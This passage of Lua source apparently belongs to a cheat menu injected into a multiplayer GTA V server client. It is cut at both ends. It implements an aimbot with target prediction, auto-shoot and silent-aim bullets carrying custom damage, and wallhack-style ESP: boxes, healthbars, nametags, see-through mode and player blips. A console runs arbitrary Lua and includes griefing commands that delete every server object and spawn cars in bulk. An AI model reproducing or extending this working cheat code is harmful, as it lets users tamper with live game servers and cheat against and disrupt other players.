                            wmlua.V.cansee = true
                        end

                        if wmlua.N.GetEntityHealth(wmlua.T.PossibleTargets[i]) > 0 and wmlua.V.cansee then

                            wmlua.V.ax, wmlua.V.ay, wmlua.V.az = table.unpack(wmlua.N.GetEntBonePos(wmlua.T.PossibleTargets[i], aimHitbox))
                            wmlua.V._a, wmlua.V._ax, wmlua.V._ay = wmlua.N.World3dToScreen(wmlua.V.ax, wmlua.V.ay, wmlua.V.az + 0.5)

                            wmlua.V.ax2, wmlua.V.ay2, wmlua.V.az2 = table.unpack(wmlua.N.GetEntBonePos(wmlua.V.SelPed, aimHitbox))
                            wmlua.V._a2, wmlua.V._ax2, wmlua.V._ay2 = wmlua.N.World3dToScreen(wmlua.V.ax2, wmlua.V.ay2, wmlua.V.az2 + 0.5)

                            wmlua.V.lPedDiffx = math.abs(0.5 - wmlua.V._ax)
                            wmlua.V.lPedDiffy = math.abs(0.5 - wmlua.V._ay)
                            wmlua.V.cpedDiffx = math.abs(0.5 - wmlua.V._ax2)
                            wmlua.V.cpedDiffy = math.abs(0.5 - wmlua.V._ay2)

                            wmlua.V.combineDiffL = math.abs(wmlua.V.lPedDiffx + wmlua.V.lPedDiffy)
                            wmlua.V.combineDiffC = math.abs(wmlua.V.cpedDiffx + wmlua.V.cpedDiffy)

                            if wmlua.V.combineDiffL < wmlua.V.combineDiffC or wmlua.N.GetEntityHealth(wmlua.V.SelPed) < 1 then
                                wmlua.V.SelPed = wmlua.T.PossibleTargets[i]
                                wmlua.V.Aim_newtarget = true
                            end

                            wmlua.V.px, wmlua.V.py, wmlua.V.pz = table.unpack(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()))

                        end

                        if wmlua.N.GetEntityHealth(wmlua.V.SelPed) > 0 then

                            if wmlua.T.AimbotBoneOpts[wmlua.V.SelAimbotBone] == "Head" then
                                wmlua.V.ax, wmlua.V.ay, wmlua.V.az = table.unpack(wmlua.N.GetEntBonePos(wmlua.V.SelPed, aimHitbox))
                            elseif wmlua.T.AimbotBoneOpts[wmlua.V.SelAimbotBone] == "Body" then
                                wmlua.V.ax, wmlua.V.ay, wmlua.V.az = table.unpack(wmlua.N.GetEntBonePos(wmlua.V.SelPed, aimHitbox))
                            end
                            
                            wmlua.V._a, wmlua.V._ax, wmlua.V._ay = wmlua.N.World3dToScreen(wmlua.V.ax, wmlua.V.ay, wmlua.V.az)

                            if wmlua.V.cansee then

                                if wmlua.T.PossibleTargets[i] == wmlua.V.SelPed then
                                    
                                    if wmlua.T.AimbotBoneOpts[wmlua.V.SelAimbotBone] == "Head" then
                                        aimHitbox = 31086
                                    else
                                        aimHitbox = 24818
                                    end
                                    
                                    if wmlua.V.prevPos then
                                        wmlua.V.curPos = wmlua.N.GetEntBonePos(wmlua.V.SelPed, aimHitbox)
                                        wmlua.V.diffdelta = wmlua.V.curPos - wmlua.V.prevPos
                                        wmlua.V.predDist = #(wmlua.V.curPos - wmlua.V.prevPos)
                                        wmlua.V.bxyz = (wmlua.V.curPos + wmlua.V.diffdelta)
                                        wmlua.V.bx, wmlua.V.by, wmlua.V.bz = table.unpack(wmlua.V.bxyz)
                                        wmlua.V.prevPos = wmlua.N.GetEntBonePos(wmlua.V.SelPed, aimHitbox)
                                    else
                                        wmlua.V.prevPos = wmlua.N.GetEntBonePos(wmlua.V.SelPed, aimHitbox)
                                        wmlua.V.bx, wmlua.V.by, wmlua.V.bz = table.unpack(wmlua.V.prevPos)
                                    end

                                    if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_autoshoot"]].active and wmlua.N.GetEntityHealth(wmlua.V.SelPed) > 99 and wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_vischeck"]].active and wmlua.V.cansee and wmlua.N.IsEntOnScreen(wmlua.V.SelPed) or wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_autoshoot"]].active and wmlua.N.IsEntOnScreen(wmlua.V.SelPed) and wmlua.N.GetEntityHealth(wmlua.V.SelPed) > 99 then
                                        wmlua.N.SetControlNormal(0, 24, 1.0)
                                    end

                                    if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_drawtarget"]].active and wmlua.F.aim_inFOV(wmlua.V._ax, wmlua.V._ay) then
                                        wmlua.V.p1 = wmlua.N.GetEntBonePos(wmlua.N.GetPlayerPed(), 31086, 0.0)
                                        wmlua.N.DrawLine(wmlua.V.p1, wmlua.V.bx, wmlua.V.by, wmlua.V.bz, 255,0,0,255)
                                    end

                                    if wmlua.N.IsPed_Shooting(wmlua.N.GetPlayerPed()) and wmlua.V.cansee then
                                        if not wmlua.V.predDist then
                                            wmlua.V.predDist = 0.3
                                        end
                                        wmlua.V.chr = math.random(1, 100)
                                        if wmlua.F.aim_inFOV(wmlua.V._ax, wmlua.V._ay) and wmlua.V.chr <= wmlua.V.Aim_actchance then
        
                                            local weapon = wmlua.N.Get_SelectedPedWeapon(wmlua.N.GetPlayerPed())
        
                                            if wmlua.V.Aim_damage ~= 0 then
                                                wmlua.V.aimdmg = wmlua.V.Aim_damage
                                            elseif wmlua.T.AimbotBoneOpts[wmlua.V.SelAimbotBone] == "Head" then
                                                wmlua.V.aimdmg = 121
                                            else
                                                wmlua.V.aimdmg = 40
                                                wmlua.V.mbydmg = wmlua.N.GetWeaponDamage(wmlua.N.GetSelectedPedWeapon(wmlua.N.GetPlayerPed()))
                                                if wmlua.V.mbydmg ~= nil and wmlua.V.mbydmg ~= 0 then
                                                    wmlua.V.aimdmg = wmlua.V.mbydmg
                                                end
                                            end
                                            
                                            if wmlua.N.Get_SelectedPedWeapon(wmlua.N.GetPlayerPed()) == wmlua.N.GetHashKey("weapon_stungun") then
                                                wmlua.V.aimdmg = 0
                                            end
                                            
                                            wmlua.V.px, wmlua.V.py, wmlua.V.pz = table.unpack(wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed()))
                                            
                                            if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_fastbullet"]].active then
                                                wmlua.V.BulletSpeed = 99999999999.0
                                            else
                                                wmlua.V.BulletSpeed = 0.0
                                            end
                                            
                                            wmlua.V.aimdmg = math.floor(wmlua.V.aimdmg)
                                            
                                            if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Aim_extendrange"]].active and wmlua.V.cansee then
                                                wmlua.N.SetScopeZoomFactor(6.0)
                                                if wmlua.T.AimbotBoneOpts[wmlua.V.SelAimbotBone] == "Head" then
                                                    wmlua.H.WMInvokeNative(0x867654CBC7606F2C, wmlua.V.bx, wmlua.V.by + 0.12 + wmlua.V.predDist, wmlua.V.bz, wmlua.V.bx, wmlua.V.by, wmlua.V.bz, tonumber(wmlua.V.aimdmg), true, weapon, wmlua.N.GetPlayerPed(), false, true, wmlua.V.BulletSpeed)
                                                else
                                                    wmlua.H.WMInvokeNative(0x867654CBC7606F2C, wmlua.V.bx, wmlua.V.by + 0.18 + wmlua.V.predDist, wmlua.V.bz, wmlua.V.bx, wmlua.V.by, wmlua.V.bz, tonumber(wmlua.V.aimdmg), true, weapon, wmlua.N.GetPlayerPed(), false, true, wmlua.V.BulletSpeed)
                                                end
                                            elseif wmlua.V.cansee then
                                                wmlua.H.WMInvokeNative(0x867654CBC7606F2C, wmlua.V.px, wmlua.V.py, wmlua.V.pz + 0.6, wmlua.V.bx, wmlua.V.by, wmlua.V.bz, tonumber(wmlua.V.aimdmg), true, weapon, wmlua.N.GetPlayerPed(), false, true, wmlua.V.BulletSpeed)
                                            end
        
                                        elseif wmlua.F.aim_inFOV(wmlua.V._ax, wmlua.V._ay) and wmlua.V.chr > wmlua.V.Aim_actchance and wmlua.N.GetEntityHealth(wmlua.V.SelPed) > 0 then
                                            wmlua.F.EventLogInsert("[~b~WM~w~] Aimbot didn't act due to act chance", 1000)
                                        end
                                        break
                                    end
                                    
                                end

                            end

                        end

                    end

                end

            end

        elseif wmlua.N.IsPed_Shooting(wmlua.N.GetPlayerPed()) then

            --[[wmlua_print('\nAA Comparison: ' .. wmlua.V.ShotsFired .. wmlua.STRINGS[2] .. wmlua.V.Aim_actafter)
            wmlua_print('\nSA Comparison: ' .. wmlua.V.ShotsFired .. wmlua.STRINGS[2] .. wmlua.V.Aim_stopafter)]]

        end

    end

    function wmlua.F.AimTargetPlayer()

        wmlua.F.CFS("wmlua.V.Aim_target_player")

    end

    function wmlua.F.AimTargetNpc()

        wmlua.F.CFS("wmlua.V.Aim_target_npc")

    end

    function wmlua.F.AimTargetAnimals()

        wmlua.F.CFS("wmlua.V.Aim_target_animal")

    end

    function wmlua.F.AimDrawFov()

        wmlua.F.CFS("wmlua.V.Aim_drawfov")

    end

    function wmlua.F.AimChangeActChance()

        wmlua.V.inp = wmlua.F.GetInput("Act Chance")
        wmlua.V.inp = tonumber(wmlua.V.inp)
        if type(wmlua.V.inp) == wmlua.STRINGS[53] then
            wmlua.V.Aim_actchance = tonumber(wmlua.V.inp)
            wmlua.F.CFT("wmlua.V.Aim_changeactchance", "Act Chance " .. wmlua.V.Aim_actchance)
        else
            wmlua.F.EventLogInsert("[~b~WM~w~] Invalid Input", 2000)
        end

    end

    function wmlua.F.AimChangeActAfter()

        wmlua.V.inp = wmlua.F.GetInput("Act after shot")
        wmlua.V.inp = tonumber(wmlua.V.inp)
        if type(wmlua.V.inp) == wmlua.STRINGS[53] then
            wmlua.V.Aim_actafter = tonumber(wmlua.V.inp)
            wmlua.F.CFT("wmlua.V.Aim_changeactafter", "Act After " .. wmlua.V.Aim_actafter)
        else
            wmlua.F.EventLogInsert("[~b~WM~w~] Invalid Input", 2000)
        end

    end

    function wmlua.F.AimChangeStopAfter()

        wmlua.V.inp = wmlua.F.GetInput("Stop after shot")
        wmlua.V.inp = tonumber(wmlua.V.inp)
        if type(wmlua.V.inp) == wmlua.STRINGS[53] then
            wmlua.V.Aim_stopafter = tonumber(wmlua.V.inp)
            wmlua.F.CFT("wmlua.V.Aim_changestopafter", "Stop After " .. wmlua.V.Aim_stopafter)
        else
            wmlua.F.EventLogInsert("[~b~WM~w~] Invalid Input", 2000)
        end

    end

    function wmlua.F.AimChangeControl()

        wmlua.V.inp = wmlua.F.GetInput("Enter Desired Aim Control")
        wmlua.V.inp = tonumber(wmlua.V.inp)
        if type(wmlua.V.inp) == wmlua.STRINGS[53] then
            wmlua.V.Aim_control = tonumber(wmlua.V.inp)
            wmlua.F.CFT("wmlua.V.Aim_changecontrol", "On Control " .. wmlua.V.Aim_control)
        else
            wmlua.F.EventLogInsert("[~b~WM~w~] Invalid Input", 2000)
        end

    end

    function wmlua.F.Aim_getBone()
        return wmlua.T.AimbotBoneOpts[wmlua.V.SelAimbotBone]
    end

    function wmlua.F.AimChangebone()

        wmlua.V.SelAimbotBone = wmlua.V.SelAimbotBone + 1
        if wmlua.V.SelAimbotBone > #wmlua.T.AimbotBoneOpts then
            wmlua.V.SelAimbotBone = 1
        end

        wmlua.F.CFT("wmlua.V.Aim_changebone", "Hitbox ~r~" .. wmlua.F.Aim_getBone())

    end

    function wmlua.F.AimExtendRange()

        wmlua.F.CFS("wmlua.V.Aim_extendrange")

    end

    function wmlua.F.AimAutoShoot()

        wmlua.F.CFS("wmlua.V.Aim_autoshoot")

    end

    function wmlua.F.AimFastBullet()

        wmlua.F.CFS("wmlua.V.Aim_fastbullet")

    end

    function wmlua.F.AimDrawCrosshair()

        wmlua.F.CFS("wmlua.V.Aim_drawcrosshair")

    end

    function wmlua.F.AimDrawTarget()

        wmlua.F.CFS("wmlua.V.Aim_drawtarget")

    end

    function wmlua.F.AimWhitelistAdd()

        wmlua.V.inp = wmlua.F.GetInput("Enter Player Id")
        wmlua.V.inp = wmlua.F.SIDToPID(wmlua.V.inp)

        if wmlua.V.inp ~= -69 then

            wmlua.V.inp_pname = wmlua.N.GetPlayerName(wmlua.V.inp)

            wmlua.F.InsertToTable(wmlua.T.FriendList, wmlua.N.GetPlayerServerId(wmlua.V.inp))
            wmlua.F.EventLogInsert("[~b~WM~w~] Added " .. wmlua.V.inp_pname .. " to the Aimbot Whitelist", 3000)

        else

            wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)

        end

    end

    function wmlua.F.AimWhitelistRemove()

        wmlua.V.inp = wmlua.F.GetInput("Enter Player Id")
        wmlua.V.inp = wmlua.F.SIDToPID(wmlua.V.inp)

        if wmlua.V.inp ~= -69 then
            wmlua.V.inp_pname = wmlua.N.GetPlayerName(wmlua.V.inp)

            for i = 1, #wmlua.T.FriendList do
                if wmlua.N.GetPlayerServerId(wmlua.V.inp) == wmlua.T.FriendList[i] then
                    table.remove(wmlua.T.FriendList, i)
                    wmlua.F.EventLogInsert("[~b~WM~w~] Removed " .. wmlua.V.inp_pname .. " from the Aimbot Whitelist", 3000)
                    return 1
                end
            end

            wmlua.F.EventLogInsert("[~b~WM~w~] Player " .. wmlua.V.inp_pname .. " not found in the Aimbot Whitelist", 3000)

        else

            wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)

        end

    end

    function wmlua.F.AimWhitelistClear()

        wmlua.T.FriendList = {}

        wmlua.F.EventLogInsert("[~b~WM~w~] Cleared Aimbot Whitelist", 3000)

    end

    wmlua.V.BoxAdj = 0.2

    function wmlua.F.DrawEntityBox(entity,r,g,b,a) -- not mine
        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.AllDraw"]].active and wmlua.N.DoesEntityExist(entity) then

            r = r or 255
            g = g or 255
            b = b or 255
            a = a or 40

            local model = wmlua.N.GetEntityModel(entity)
            local min,max = wmlua.N.GetModelDimensions(model)

            if wmlua.N.IsEntityAVehicle(entity) then
                max = vector3(max.x - wmlua.V.BoxAdj + 0.3, max.y + 0.15, max.z)
                min = vector3(min.x + wmlua.V.BoxAdj - 0.3, min.y - 0.15, min.z)
            else
                max = vector3(max.x - wmlua.V.BoxAdj, max.y + 0.15, max.z)
                min = vector3(min.x + wmlua.V.BoxAdj, min.y - 0.15, min.z + 0.2)
            end

            local top_front_right = wmlua.N.GetOffsetFromEntityInWorldCoords(entity,max)
            local top_back_right = wmlua.N.GetOffsetFromEntityInWorldCoords(entity,vector3(max.x,min.y,max.z))
            local bottom_front_right = wmlua.N.GetOffsetFromEntityInWorldCoords(entity,vector3(max.x,max.y,min.z))
            local bottom_back_right = wmlua.N.GetOffsetFromEntityInWorldCoords(entity,vector3(max.x,min.y,min.z))

            local top_front_left = wmlua.N.GetOffsetFromEntityInWorldCoords(entity,vector3(min.x,max.y,max.z))
            local top_back_left = wmlua.N.GetOffsetFromEntityInWorldCoords(entity,vector3(min.x,min.y,max.z))
            local bottom_front_left = wmlua.N.GetOffsetFromEntityInWorldCoords(entity,vector3(min.x,max.y,min.z))
            local bottom_back_left = wmlua.N.GetOffsetFromEntityInWorldCoords(entity,min)

            -- LINES

            r = 255
            g = 255
            b = 255
            a = 255

            -- RIGHT SIDE
            wmlua.N.DrawLine(top_front_right + 0.001,top_back_right + 0.001,r,g,b,a)
            wmlua.N.DrawLine(top_front_right,top_back_right,r,g,b,a)
            wmlua.N.DrawLine(top_front_right - 0.001,top_back_right - 0.001,r,g,b,a)

            wmlua.N.DrawLine(top_front_right + 0.001,bottom_front_right + 0.001,r,g,b,a)
            wmlua.N.DrawLine(top_front_right,bottom_front_right,r,g,b,a)
            wmlua.N.DrawLine(top_front_right - 0.001,bottom_front_right - 0.001,r,g,b,a)

            wmlua.N.DrawLine(bottom_front_right + 0.001,bottom_back_right + 0.001,r,g,b,a)
            wmlua.N.DrawLine(bottom_front_right,bottom_back_right,r,g,b,a)
            wmlua.N.DrawLine(bottom_front_right - 0.001,bottom_back_right - 0.001,r,g,b,a)

            wmlua.N.DrawLine(top_back_right + 0.001,bottom_back_right + 0.001,r,g,b,a)
            wmlua.N.DrawLine(top_back_right,bottom_back_right,r,g,b,a)
            wmlua.N.DrawLine(top_back_right - 0.001,bottom_back_right - 0.001,r,g,b,a)

            -- LEFT SIDE

            wmlua.N.DrawLine(top_front_left + 0.001,top_back_left + 0.001,r,g,b,a)
            wmlua.N.DrawLine(top_front_left,top_back_left,r,g,b,a)
            wmlua.N.DrawLine(top_front_left - 0.001,top_back_left - 0.001,r,g,b,a)

            wmlua.N.DrawLine(top_back_left + 0.001,bottom_back_left + 0.001,r,g,b,a)
            wmlua.N.DrawLine(top_back_left,bottom_back_left,r,g,b,a)
            wmlua.N.DrawLine(top_back_left - 0.001,bottom_back_left - 0.001,r,g,b,a)

            wmlua.N.DrawLine(top_front_left + 0.001,bottom_front_left + 0.001,r,g,b,a)
            wmlua.N.DrawLine(top_front_left,bottom_front_left,r,g,b,a)
            wmlua.N.DrawLine(top_front_left - 0.001,bottom_front_left - 0.001,r,g,b,a)

            wmlua.N.DrawLine(bottom_front_left + 0.001,bottom_back_left + 0.001,r,g,b,a)
            wmlua.N.DrawLine(bottom_front_left,bottom_back_left,r,g,b,a)
            wmlua.N.DrawLine(bottom_front_left - 0.001,bottom_back_left - 0.001,r,g,b,a)


            -- Connection
            wmlua.N.DrawLine(top_front_right + 0.001,top_front_left + 0.001,r,g,b,a)
            wmlua.N.DrawLine(top_front_right,top_front_left,r,g,b,a)
            wmlua.N.DrawLine(top_front_right - 0.001,top_front_left - 0.001,r,g,b,a)

            wmlua.N.DrawLine(top_back_right + 0.001,top_back_left + 0.001,r,g,b,a)
            wmlua.N.DrawLine(top_back_right,top_back_left,r,g,b,a)
            wmlua.N.DrawLine(top_back_right - 0.001,top_back_left - 0.001,r,g,b,a)

            wmlua.N.DrawLine(bottom_front_left + 0.001,bottom_front_right + 0.001,r,g,b,a)
            wmlua.N.DrawLine(bottom_front_left,bottom_front_right,r,g,b,a)
            wmlua.N.DrawLine(bottom_front_left - 0.001,bottom_front_right - 0.001,r,g,b,a)

            wmlua.N.DrawLine(bottom_back_left + 0.001,bottom_back_right + 0.001,r,g,b,a)
            wmlua.N.DrawLine(bottom_back_left,bottom_back_right,r,g,b,a)
            wmlua.N.DrawLine(bottom_back_left - 0.001,bottom_back_right - 0.001,r,g,b,a)

            -- POLYGONS

            r = 0
            g = 0
            b = 0
            a = 100

            -- FRONT
            wmlua.N.DrawPoly(top_front_left,top_front_right,bottom_front_right,r,g,b,a)
            wmlua.N.DrawPoly(bottom_front_right,bottom_front_left,top_front_left,r,g,b,a)

            -- TOP
            wmlua.N.DrawPoly(top_front_right,top_front_left,top_back_right,r,g,b,a)
            wmlua.N.DrawPoly(top_front_left,top_back_left,top_back_right,r,g,b,a)

            -- BACK
            wmlua.N.DrawPoly(top_back_right,top_back_left,bottom_back_right,r,g,b,a)
            wmlua.N.DrawPoly(top_back_left,bottom_back_left,bottom_back_right,r,g,b,a)

            -- LEFT
            wmlua.N.DrawPoly(top_back_left,top_front_left,bottom_front_left,r,g,b,a)
            wmlua.N.DrawPoly(bottom_front_left,bottom_back_left,top_back_left,r,g,b,a)

            -- RIGHT
            wmlua.N.DrawPoly(top_front_right,top_back_right,bottom_front_right,r,g,b,a)
            wmlua.N.DrawPoly(top_back_right,bottom_back_right,bottom_front_right,r,g,b,a)

            -- BOTTOM
            wmlua.N.DrawPoly(bottom_front_left,bottom_front_right,bottom_back_right,r,g,b,a)
            wmlua.N.DrawPoly(bottom_back_right,bottom_back_left,bottom_front_left,r,g,b,a)

            return true

        end
        return false
    end

    function wmlua.F.VISDrawTalking()

        wmlua.F.CFS("wmlua.V.Vis_drawtalking")

    end

    function wmlua.F.VISNametags()

        wmlua.F.CFS("wmlua.V.Vis_nametags")

    end

    function wmlua.F.VISLineESP()

        wmlua.F.CFS("wmlua.V.Vis_lineesp")

    end

    function wmlua.F.VISProximityESP()

        wmlua.F.CFS("wmlua.V.Vis_proximityesp")

    end

    function wmlua.F.VIS2DBoxes()

        wmlua.F.CFS("wmlua.V.Vis_2dboxes")

    end

    function wmlua.F.VIS2DBoxes2()

        wmlua.F.CFS("wmlua.V.Vis_2dboxes2")

    end

    function wmlua.F.VISHealthbars()

        if not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_healthbars"]].active and wmlua.F.GetInput("Show HP Text? (y=yes)") == "y" then
            wmlua.V.show_healthbarText = true
        else
            wmlua.V.show_healthbarText = false
        end
        
        wmlua.F.CFS("wmlua.V.Vis_healthbars")
        
    end

    function wmlua.F.VISCleanHealthbars()

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_cleanhealthbars"]].active then
            for k,v in pairs(wmlua.T.GamerTags) do
                wmlua.N.RemoveGamerTag(v.tag)
                wmlua.T.GamerTags[k] = nil
            end
        end

        wmlua.F.CFS("wmlua.V.Vis_cleanhealthbars")
        
    end

    wmlua.T.NPCModelList = {}
    wmlua.T.NPCModelList[802685111] = "Fish"
    wmlua.T.NPCModelList[-1011537562] = "Rat"
    wmlua.T.NPCModelList[-541762431] = "Rabbit"
    wmlua.T.NPCModelList[1268862154] = "Nudist Cult Member"
    wmlua.T.NPCModelList[1430544400] = "Nudist Cult Member"
    wmlua.T.NPCModelList[1682622302] = "Coyote"
    wmlua.T.NPCModelList[-50684386] = "Cow"
    wmlua.T.NPCModelList[402729631] = "Crow"
    wmlua.T.NPCModelList[-745300483] = "Seagull"
    wmlua.T.NPCModelList[-664053099] = "Deer"
    wmlua.T.NPCModelList[1794449327] = "Chicken"
    wmlua.T.NPCModelList[307287994] = "Mountain Lion"
    wmlua.T.NPCModelList[-1788665315] = "Rottweiler"
    wmlua.T.NPCModelList[351016938] = "Rottweiler"
    wmlua.T.NPCModelList[111281960] = "Pigeon"
    wmlua.T.NPCModelList[-2077218039] = "Gang Member"
    wmlua.T.NPCModelList[-48477765] = "Gang Member"
    wmlua.T.NPCModelList[588969535] = "Gang Member"
    wmlua.T.NPCModelList[-198252413] = "Gang Member"
    wmlua.T.NPCModelList[-613248456] = "Gang Member"
    wmlua.T.NPCModelList[599294057] = "Gang Member"
    wmlua.T.NPCModelList[1226102803] = "Gang Member"
    wmlua.T.NPCModelList[810804565] = "Gang Member"
    wmlua.T.NPCModelList[1752208920] = "Gang Member"
    wmlua.T.NPCModelList[1466037421] = "Gang Member"
    wmlua.T.NPCModelList[1520708641] = "Gang Member"
    wmlua.T.NPCModelList[653210662] = "Gang Member"
    wmlua.T.NPCModelList[-1872961334] = "Gang Member"
    wmlua.T.NPCModelList[663522487] = "Gang Member"
    wmlua.T.NPCModelList[832784782] = "Gang Member"
    wmlua.T.NPCModelList[-1275859404] = "Armed Mercenary"
    wmlua.T.NPCModelList[1644266841] = "Construction Worker"
    wmlua.T.NPCModelList[-1920001264] = "SWAT"
    wmlua.T.NPCModelList[-1286380898] = "EMT"
    wmlua.T.NPCModelList[1939545845] = "Police Trooper"
    wmlua.T.NPCModelList[1581098148] = "Police Officer"
    wmlua.T.NPCModelList[-1229853272] = "Fireman"

    function wmlua.F.NPCModelName(model)

        if wmlua.T.NPCModelList[model] then
            return '[AI] ' .. wmlua.T.NPCModelList[model]
        else
            return 'NPC'
            --return tostring(model)
        end

    end

    function wmlua.F.VISNPCESP()

        if not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_npc_esp"]].active then
            wmlua.V.Vis_npc_esp_dist = wmlua.F.GetInput("Enter max distance (meters)")
        end

        wmlua.F.CFS("wmlua.V.Vis_npc_esp")

    end

    function wmlua.F.VISWeaponESP()

        if not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_weaponesp"]].active then
            wmlua.V.Vis_weaponesp_dist = wmlua.F.GetInput("Enter max distance (meters)")
        end

        wmlua.F.CFS("wmlua.V.Vis_weaponesp")

    end

    function wmlua.F.VISImpacts()

        if not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_impacts"]].active then

            wmlua.V.Vis_impact_drawtime = wmlua.F.GetInput("Enter draw time in MS")
            wmlua.V.Vis_impact_drawtime = tonumber(wmlua.V.Vis_impact_drawtime)

            if type(wmlua.V.Vis_impact_drawtime) == "number" then

                wmlua.V.Vis_impact_dt = wmlua.V.Vis_impact_drawtime

            end

        end

        wmlua.F.CFS("wmlua.V.Vis_impacts")

    end

    function wmlua.F.VISVehESP()

        if not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_vehesp"]].active then
            wmlua.V.Vis_vehesp_dist = wmlua.F.GetInput("Enter max distance (meters)")
            wmlua.V.Vis_vehesp_dist = tonumber(wmlua.V.Vis_vehesp_dist)
        end

        if type(wmlua.V.Vis_vehesp_dist) == wmlua.STRINGS[53] then
            wmlua.F.CFS("wmlua.V.Vis_vehesp")
        end

    end

    function wmlua.F.VISLocalToggle()

        wmlua.F.CFS("wmlua.V.Vis_localtoggle")

    end

    function wmlua.F.VISDamageToggle()

        wmlua.F.CFS("wmlua.V.Vis_damagetoggle")

    end

    function wmlua.F.VISAlwaysLit()

        wmlua.F.CFS("wmlua.V.Vis_alwayslit")

    end

    function wmlua.F.VISLitPlayers()

        if not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_litplayers"]].active then 
            wmlua.V.Vis_litplayers_rgb = wmlua.F.GetInput("Enter RGB Color (0,0,0)") 
            wmlua.V.Vis_litplayers_bn = wmlua.F.GetInput("Enter Brightness")
            wmlua.V.Vis_litplayers_bn = tonumber(wmlua.V.Vis_litplayers_bn) + .0
            wmlua.F.CleanString(wmlua.V.Vis_litplayers_rgb, "spacing")
            wmlua.V.Vis_litplayers_rgb = wmlua.F.Split(wmlua.V.Vis_litplayers_rgb, ",")
            for i = 1, #wmlua.V.Vis_litplayers_rgb do wmlua.V.Vis_litplayers_rgb[i] = tonumber(wmlua.V.Vis_litplayers_rgb[i]) end
            wmlua.V.lpr, wmlua.V.lpg, wmlua.V.lpb = table.unpack(wmlua.V.Vis_litplayers_rgb)
        end

        if type(wmlua.V.lpr) == "number" and type(wmlua.V.lpg) == "number" and type(wmlua.V.lpb) == "number" and type(wmlua.V.Vis_litplayers_bn) == "number" then  

            wmlua.F.CFS("wmlua.V.Vis_litplayers")

        else 

            wmlua.F.EventLogInsert("[~r~WM~w~] Invalid Input, Try again")

        end

    end

    function wmlua.F.VISNoEffects()

        wmlua.F.CFS("wmlua.V.Vis_noeffects")

    end

    function wmlua.F.VISAntiFirstPerson()

        wmlua.F.CFS("wmlua.V.Vis_antifirstperson")

    end

    function wmlua.F.VISDrawHP()

        wmlua.F.CFS("wmlua.V.Vis_drawhp")

    end

    function wmlua.F.VISHideNotifications()

        wmlua.F.CFS("wmlua.V.Vis_hidenotifications")

    end

    function wmlua.F.VISBigMap()

        wmlua.F.CFS("wmlua.V.Vis_bigmap")

    end

    function wmlua.F.VISBlips()

        wmlua.F.CFS("wmlua.V.Vis_playerblips")

    end

    function wmlua.F.VISSafeBlips()

        wmlua.F.CFS("wmlua.V.Vis_safeplayerblips")

        if not wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_safeplayerblips"]].active then

            for _, v in pairs(wmlua.T.spblips) do
                if v.blip ~= nil then
                    wmlua.N.RemoveBlip(v.blip)
                end
            end

        end

    end

    function wmlua.F.VISHeatSeek(input)

        wmlua.F.CFS("wmlua.V.Vis_heatseek")

        if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.Vis_heatseek"]].active then

            if input == nil then
                wmlua.V.bgcolor = wmlua.F.GetInput("Enter World Color r,g,b")
                if wmlua.V.bgcolor == wmlua.STRINGS[19] then
                    wmlua.V.bgcolor = {0,25,25}
                end
            else
                wmlua.V.bgcolor = {30,30,30}
            end

            wmlua.H.WMInvokeNative(0x1086127B3A63505E, table.unpack(wmlua.V.bgcolor))
            wmlua.N.SetSeethrough(true)
            wmlua.H.WMInvokeNative(wmlua.STRINGS[58], 0)
            wmlua.H.WMInvokeNative(wmlua.STRINGS[59], 0)

        else

            wmlua.N.SetSeethrough(false)

        end

    end

    function wmlua.F.VIS3DBoxes()

        wmlua.F.CFS("wmlua.V.Vis_3dboxes")

    end

    function wmlua.F.LUARunCode()

        local code = wmlua.F.GetInput("Enter LUA Code")
        if string.find(code, 'wm_menu.', 1, true) then
            code = string.gsub(code, 'wm_menu', 'wmlua')
        end

        if code == "-km" then

            wmlua.KM()

        elseif code == '-objs' then

            local kek = wmlua.N.GetEntList('CObject')
            wmlua_print(json.encode(kek))
            wmlua_Thread(function()
                for i = 1, #kek do
                    wmlua.F.RequestControl(kek[i])
                    wmlua.N.DeleteEntity(kek[i])
                    wmlua_Schleep(0)
                end
            end)

        elseif code == "-t1" then

            if wmlua.T.Cheese[wmlua.T.FI["wmlua.V.CAM_toggle"]].active then
                wmlua.F.EventLogInsert('active')
            else
                wmlua.F.EventLogInsert('inactive')
            end
            
        elseif code == '-c' then

            wmlua.menu.v.displayinfo = false

        elseif code == '-inf' then

            local infList = {}
            for i = 1, 620 do
                infList[i] = i
            end
            wmlua.menu.f.handleinfo(infList)

        elseif code == "-sprite" then

            wmlua.V.TextDict = wmlua.F.GetInput("Dict")
            wmlua.V.Sprite = wmlua.F.GetInput("Sprite")

        elseif code == "-dev" then

            for k,v in pairs(returnAsNumber) do
                print(k)
            end
            wmlua.dev = not wmlua.dev

            for k,v in pairs(_G) do
                if oldG[k] == nil then
                    wmlua.H.Trace('\nnew global ' .. k .. '\n')
                    wmlua.F.EventLogInsert('new global: ' .. k,1000*120)
                end
            end
            
            wmlua.F.InsertToTable(wmlua.T.FreecamModes, 'Silent Kill')

            for k,v in pairs(wmlua.T.ResourceDI) do
                wmlua_print(k .. " > " .. tostring(v))
            end

        elseif code == "-scfg" then

            wmlua.V.ShowCFG = true

        elseif code == "-f" then

            wmlua_print("Feature Count: " .. wmlua.V.fc)

            wmlua.F.BuildFeatureList()

        elseif code == "-loads" then

            wmlua.RetrieveLoads()

        elseif code == "-c=1" then

            wmlua.ST.SpamCars = {
                "Duster",
            }

        elseif code == "-c=0" then

            wmlua.ST.SpamCars = {
                "Stretch",
